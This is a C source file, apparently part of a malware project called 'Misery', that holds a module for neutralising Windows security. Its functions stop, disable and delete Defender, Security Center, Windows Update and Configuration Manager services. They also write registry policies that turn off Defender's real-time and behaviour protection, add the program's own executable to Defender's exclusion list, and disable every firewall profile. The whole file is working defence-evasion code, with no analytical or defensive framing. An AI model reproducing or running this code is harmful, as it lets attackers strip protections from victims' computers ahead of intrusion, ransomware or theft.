#include "security.h"
#include "misery_config.h"
#include <winsvc.h>
#include <stdio.h>
#include <string.h>

static int g_security_last_error = 0;
static DWORD g_services_killed = 0;

bool SecurityManageService(const char *svcName, bool stop_and_delete) {
    if (!svcName) return false;
    
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) {
        g_security_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "SecurityManageService: Failed to open SCM (err: %d)", g_security_last_error);
        return false;
    }

    SC_HANDLE hSvc = OpenServiceA(hSCM, svcName,
                                  SERVICE_STOP | SERVICE_QUERY_STATUS |
                                  SERVICE_CHANGE_CONFIG | DELETE);
    if (!hSvc) {
        g_security_last_error = GetLastError();
        CloseServiceHandle(hSCM);
        return false;
    }

    if (stop_and_delete) {
        SERVICE_STATUS ss = {0};
        if (ControlService(hSvc, SERVICE_CONTROL_STOP, &ss)) {
            MiseryLog(MISERY_LOG_INFO, "SecurityManageService: Stopped [%s]", svcName);
        }

        if (ChangeServiceConfigA(hSvc, SERVICE_NO_CHANGE, SERVICE_DISABLED,
                                SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL,
                                NULL, NULL, NULL)) {
            MiseryLog(MISERY_LOG_INFO, "SecurityManageService: Disabled [%s]", svcName);
        }

        if (DeleteService(hSvc)) {
            MiseryLog(MISERY_LOG_INFO, "SecurityManageService: Deleted [%s]", svcName);
            g_services_killed++;
        }
    }

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    return true;
}

bool SecurityDisableDefender(void) {
    HKEY hk = NULL;
    DWORD val = 1;
    DWORD dwDisp;

    MiseryLog(MISERY_LOG_INFO, "SecurityDisableDefender: Starting Defender disable");

    /* DisableAntiSpyware policy */
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp) == ERROR_SUCCESS) {
        RegSetValueExA(hk, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hk);
        MiseryLog(MISERY_LOG_INFO, "SecurityDisableDefender: Set DisableAntiSpyware");
    }

    /* Disable real-time protection */
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp) == ERROR_SUCCESS) {
        RegSetValueExA(hk, "DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegSetValueExA(hk, "DisableBehaviorMonitoring", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegSetValueExA(hk, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegSetValueExA(hk, "DisableOnAccessProtection", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegSetValueExA(hk, "DisableIOAVProtection", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hk);
        MiseryLog(MISERY_LOG_INFO, "SecurityDisableDefender: Disabled real-time protections");
    }

    /* Add our process to exclusion list */
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Processes",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp) == ERROR_SUCCESS) {
        RegSetValueExA(hk, "MiseryExclude", 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hk);
        MiseryLog(MISERY_LOG_INFO, "SecurityDisableDefender: Added process to exclusion list");
    }

    return true;
}

bool SecurityKillSecurityServices(void) {
    const char *svcs[] = {
        "WinDefend",
        "SecurityHealthService",
        "WdNisSvc",
        "Sense",
        "WdBoot",
        "WdFilter",
        "MsMpEng",
        "NisSrv",
        "MpKslDrv",
        "wscsvc",
        "wuauserv",  /* Windows Update */
        "ccmexec",   /* Configuration Manager */
        NULL
    };

    MiseryLog(MISERY_LOG_INFO, "SecurityKillSecurityServices: Starting security service termination");

    for (int i = 0; svcs[i]; i++) {
        SecurityManageService(svcs[i], true);
    }

    MiseryLog(MISERY_LOG_INFO, "SecurityKillSecurityServices: Terminated %lu services", g_services_killed);
    return true;
}

bool SecurityDisableFirewall(void) {
    HKEY hk = NULL;
    DWORD val0 = 0;
    const char *fwPaths[] = {
        "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile",
        "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile",
        "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile"
    };

    MiseryLog(MISERY_LOG_INFO, "SecurityDisableFirewall: Disabling Windows Firewall");

    for (int i = 0; i < 3; i++) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, fwPaths[i], 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
            RegSetValueExA(hk, "EnableFirewall", 0, REG_DWORD, (BYTE*)&val0, sizeof(val0));
            RegSetValueExA(hk, "DoNotAllowExceptions", 0, REG_DWORD, (BYTE*)&val0, sizeof(val0));
            RegCloseKey(hk);
        }
    }

    MiseryLog(MISERY_LOG_INFO, "SecurityDisableFirewall: Firewall profiles disabled");
    return true;
}